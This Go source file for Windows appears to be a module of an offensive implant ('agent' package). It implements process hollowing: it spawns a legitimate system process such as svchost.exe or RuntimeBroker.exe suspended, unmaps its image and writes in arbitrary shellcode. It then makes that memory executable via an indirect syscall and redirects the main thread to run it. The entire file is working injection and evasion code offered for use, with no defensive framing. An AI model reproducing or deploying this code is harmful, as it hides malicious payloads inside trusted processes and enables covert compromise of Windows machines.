//go:build windows

package agent

// Process hollowing — inject shellcode into a newly spawned suspended process
// by unmapping its original PE image and replacing execution at the entry thread.
//
// Flow:
//  1. Spawn target suspended (plain — PPID spoof optional)
//  2. NtUnmapViewOfSection to remove the original PE mapping
//  3. NtAllocateVirtualMemory in the target at a fresh address
//  4. WriteProcessMemory to copy shellcode
//  5. NtProtectVirtualMemory RW → RX (indirect syscall)
//  6. Hijack main thread RIP → shellcode base
//  7. ResumeThread

import (
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

// hollowProcess spawns `target` suspended, hollows it, injects `sc`, and resumes.
// target should be a full path; falls back to svchost.exe / dllhost.exe if empty.
func hollowProcess(target string, sc []byte) (string, error) {
	if len(sc) == 0 {
		return "", fmt.Errorf("hollow: empty shellcode")
	}
	if target == "" {
		sysroot := os.Getenv("SystemRoot")
		if sysroot == "" {
			sysroot = `C:\Windows`
		}
		for _, c := range []string{
			sysroot + `\System32\RuntimeBroker.exe`,
			sysroot + `\System32\dllhost.exe`,
			sysroot + `\System32\svchost.exe`,
		} {
			if _, err := os.Stat(c); err == nil {
				target = c
				break
			}
		}
	}

	// ── 1. Spawn suspended ────────────────────────────────────────────────────
	pi, err := spawnSuspendedPlain(target)
	if err != nil {
		return "", fmt.Errorf("hollow spawn(%s): %w", target, err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// ── 2. Find image base via PEB ────────────────────────────────────────────
	imageBase, err := hollowReadImageBase(pi.Process)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return "", fmt.Errorf("hollow peb: %w", err)
	}

	// ── 3. Unmap original image (hollow the process) ──────────────────────────
	procNtUnmapViewOfSection.Call(uintptr(pi.Process), imageBase)

	// ── 4. Allocate shellcode region in target ────────────────────────────────
	var scBase uintptr
	scSize := uintptr(len(sc))
	if err := hgAllocateVirtualMemory(pi.Process, &scBase, &scSize,
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return "", fmt.Errorf("hollow alloc: %w", err)
	}

	// ── 5. Write shellcode ────────────────────────────────────────────────────
	var written uintptr
	if err := windows.WriteProcessMemory(pi.Process, scBase, &sc[0], uintptr(len(sc)), &written); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return "", fmt.Errorf("hollow wpm: %w", err)
	}

	// ── 6. RW → RX (indirect syscall) ────────────────────────────────────────
	var oldProt uint32
	if err := ntProtectEx(pi.Process, scBase, scSize, windows.PAGE_EXECUTE_READ, &oldProt); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return "", fmt.Errorf("hollow protect: %w", err)
	}

	// ── 7. Redirect main thread RIP ───────────────────────────────────────────
	if err := hijackThread(pi.Thread, scBase); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return "", fmt.Errorf("hollow hijack: %w", err)
	}

	// ── 8. Resume ─────────────────────────────────────────────────────────────
	windows.ResumeThread(pi.Thread)

	return fmt.Sprintf("[+] hollow: %s PID %d sc=0x%x (%d B)",
		target, pi.ProcessId, scBase, len(sc)), nil
}

// hollowReadImageBase reads PEB.ImageBase from the remote process.
// On x64: PEB is at PROCESS_BASIC_INFORMATION+8, ImageBase at PEB+0x10.
func hollowReadImageBase(proc windows.Handle) (uintptr, error) {
	// PROCESS_BASIC_INFORMATION — 6 pointer-sized fields
	type pbi struct {
		ExitStatus                   uintptr
		PebBaseAddress               uintptr
		AffinityMask                 uintptr
		BasePriority                 uintptr
		UniqueProcessId              uintptr
		InheritedFromUniqueProcessId uintptr
	}
	var info pbi
	var retlen uint32
	r, _, _ := procNtQueryInformationProcess.Call(
		uintptr(proc), 0,
		uintptr(unsafe.Pointer(&info)),
		unsafe.Sizeof(info),
		uintptr(unsafe.Pointer(&retlen)),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess: 0x%x", r)
	}

	// ImageBase is at PEB+0x10 on x64
	var imageBase uintptr
	var n uintptr
	if err := windows.ReadProcessMemory(proc,
		info.PebBaseAddress+0x10,
		(*byte)(unsafe.Pointer(&imageBase)),
		unsafe.Sizeof(imageBase), &n); err != nil {
		return 0, fmt.Errorf("ReadProcessMemory PEB.ImageBase: %w", err)
	}
	return imageBase, nil
}
